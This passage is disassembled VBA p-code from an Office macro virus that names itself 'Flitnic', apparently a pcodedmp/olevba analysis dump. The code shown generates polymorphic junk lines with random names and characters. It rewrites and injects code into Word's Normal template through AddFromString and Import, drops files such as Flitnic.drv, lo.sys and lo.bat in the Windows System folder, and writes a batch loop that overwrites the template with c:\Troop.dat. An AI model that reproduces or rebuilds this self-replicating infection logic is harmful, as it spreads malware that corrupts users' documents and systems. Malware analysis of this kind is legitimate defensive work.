' 	LineCont 0x0004 01 00 00 00
' 	Ld Inn 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Inn 
' Line #257:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vDss 
' 	EndForVariable 
' 	NextVar 
' Line #258:
' 	Ld FullCodeD 
' 	Ld va 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Inn 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #259:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #260:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #261:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #262:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vDsss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #263:
' 	Label beginD2 
' Line #264:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #265:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD2 
' 	EndIf 
' Line #266:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD2 
' 	EndIf 
' Line #267:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #268:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vDsss 
' 	EndForVariable 
' 	NextVar 
' Line #269:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #270:
' 	LitStr 0x0004 "Chr("
' 	Ld z 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St Inn 
' Line #271:
' 	Ld FullCodeD 
' 	Ld va 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld Inn 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #272:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #273:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #274:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #275:
' 	LitStr 0x0001 "'"
' 	St va 
' Line #276:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vdssss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #277:
' 	Label beginD3 
' Line #278:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #279:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD3 
' 	EndIf 
' Line #280:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD3 
' 	EndIf 
' Line #281:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #282:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vdssss 
' 	EndForVariable 
' 	NextVar 
' Line #283:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld va 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #284:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #285:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #286:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Coerce (Int) 
' 	St v 
' Line #287:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vdsssss 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld v 
' 	For 
' Line #288:
' 	Label beginD4 
' Line #289:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St z 
' Line #290:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD4 
' 	EndIf 
' Line #291:
' 	LineCont 0x0004 01 00 00 00
' 	Ld z 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo beginD4 
' 	EndIf 
' Line #292:
' 	LineCont 0x0004 01 00 00 00
' 	Ld va 
' 	Ld z 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St va 
' Line #293:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld vdsssss 
' 	EndForVariable 
' 	NextVar 
' Line #294:
' 	Ld va 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	St va 
' Line #295:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld va 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #296:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #297:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St aaaa 
' Line #298:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St hh 
' Line #299:
' 	Do 
' Line #300:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	Ld aaaa 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndTerm 
' 	EndIf 
' Line #301:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Add 
' 	St hh 
' Line #302:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #303:
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	IfBlock 
' Line #304:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #305:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #306:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #307:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St Spac 
' Line #308:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St t 
' Line #309:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #310:
' 	Label beginD 
' Line #311:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #312:
' 	Do 
' Line #313:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld l 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoCD 
' 	EndIf 
' Line #314:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PosL 
' Line #315:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #316:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #317:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #318:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #319:
' 	Loop 
' Line #320:
' 	Label NoCD 
' Line #321:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #322:
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo UnsplitD 
' 	EndIf 
' Line #323:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo SplitD 
' Line #324:
' 	Label UnsplitD 
' Line #325:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St v 
' Line #326:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	St y 
' Line #327:
' 	Do 
' Line #328:
' 	Ld y 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "_"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo NoChD 
' 	EndIf 
' Line #329:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	FnLen 
' 	St l 
' Line #330:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #331:
' 	Do 
' Line #332:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PosL 
' Line #333:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #334:
' 	Ld s 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo FoundD 
' 	EndIf 
' Line #335:
' 	Loop 
' Line #336:
' 	Label FoundD 
' Line #337:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Spac 
' Line #338:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St y 
' Line #339:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Add 
' 	St hh 
' Line #340:
' 	LineCont 0x0004 01 00 00 00
' 	Ld hh 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #341:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St v 
' Line #342:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	Ld a 
' 	Concat 
' 	St y 
' Line #343:
' 	Loop 
' Line #344:
' 	Label NoChD 
' Line #345:
' 	LineCont 0x0004 01 00 00 00
' 	Ld y 
' 	St a 
' Line #346:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St c 
' Line #347:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PoslO 
' Line #348:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #349:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo beginD 
' Line #350:
' 	Label SplitD 
' Line #351:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St PosL 
' Line #352:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #353:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St k 
' Line #354:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Spac 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #355:
' 	Do 
' Line #356:
' 	LineCont 0x0004 01 00 00 00
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #357:
' 	LineCont 0x0004 01 00 00 00
' 	Ld k 
' 	Ld l 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo DC 
' 	EndIf 
' Line #358:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld k 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #359:
' 	Ld s 
' 	LitStr 0x0001 " "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	St g 
' 	EndIf 
' Line #360:
' 	Loop 
' Line #361:
' 	Label DC 
' Line #362:
' 	LineCont 0x0004 01 00 00 00
' 	Ld g 
' 	Ld Spac 
' 	Le 
' 	IfBlock 
' Line #363:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #364:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #365:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #366:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #367:
' 	Do 
' Line #368:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld l 
' 	Gt 
' 	IfBlock 
' Line #369:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #370:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #371:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #372:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PosL 
' Line #373:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #374:
' 	LineCont 0x0004 01 00 00 00
' 	Ld s 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #375:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld a 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #376:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #377:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #378:
' 	Ld s 
' 	LitStr 0x0001 " "
' 	Eq 
' 	IfBlock 
' Line #379:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Spac 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #380:
' 	Ld a 
' 	Ld PosL 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St False 
' Line #381:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St las 
' Line #382:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld False 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #383:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld las 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #384:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #385:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #386:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld Spac 
' 	Le 
' 	IfBlock 
' Line #387:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld PoslO 
' 	Sub 
' 	St wa 
' Line #388:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PoslO 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #389:
' 	Ld a 
' 	Ld PoslO 
' 	Ld wa 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #390:
' 	ElseBlock 
' Line #391:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Ld PosL 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #392:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #393:
' 	LineCont 0x000C 01 00 00 00 02 00 00 00 03 00 00 00
' 	Ld FullCodeD 
' 	Ld Temp 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #394:
' 	LineCont 0x000C 01 00 00 00 02 00 00 00 03 00 00 00
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	St PoslO 
' Line #395:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St c 
' Line #396:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextCharD 
' Line #397:
' 	ElseBlock 
' Line #398:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St c 
' Line #399:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld PoslO 
' 	Paren 
' 	Sub 
' 	St wa 
' Line #400:
' 	Ld a 
' 	Ld PoslO 
' 	Ld wa 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #401:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	Ld PosL 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St Temp2 
' Line #402:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld Temp 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Temp2 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #403:
' 	LineCont 0x0004 01 00 00 00
' 	Ld PosL 
' 	Ld Spac 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo NextLineD 
' 	EndIf 
' Line #404:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextCharD 
' Line #405:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #406:
' 	Ld a 
' 	Ld PoslO 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld PosL 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	St Temp 
' Line #407:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld Temp 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #408:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #409:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #410:
' 	Label NextCharD 
' Line #411:
' 	Loop 
' Line #412:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld y 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #413:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NextLineD 
' Line #414:
' 	Label NextLineD 
' Line #415:
' 	Loop 
' Line #416:
' 	Label EndTerm 
' Line #417:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #418:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #419:
' 	Label look 
' Line #420:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #421:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld Inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #422:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #423:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #424:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld FullCodeN 
' 	Paren 
' 	Ld Inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #425:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0014 
' 	St i 
' Line #426:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #427:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #428:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld Inn 
' 	EndForVariable 
' 	NextVar 
' Line #429:
' 	LineCont 0x0004 01 00 00 00
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #430:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #431:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #432:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #433:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #434:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #435:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #436:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #437:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #438:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo look 
' Line #439:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #440:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #441:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #442:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #443:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAtt 
' Line #444:
' 	LitStr 0x0000 ""
' 	St l 
' Line #445:
' 	LineCont 0x0004 01 00 00 00
' 	OnError eb 
' Line #446:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #447:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #448:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #449:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #450:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #451:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #452:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #453:
' 	CloseAll 
' Line #454:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #455:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #456:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #457:
' 	LineCont 0x0004 01 00 00 00
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #458:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #459:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "rem Flitnic has catched you... he, he"
' 	PrintItemNL 
' Line #460:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #461:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #462:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Move /y c:\Troop.dat "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #463:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "If exist c:\Troop.dat goto Begin"
' 	PrintItemNL 
' Line #464:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #465:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #466:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #467:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #468:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #469:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #470:
' 	Label notemp 
' Line #471:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #472:
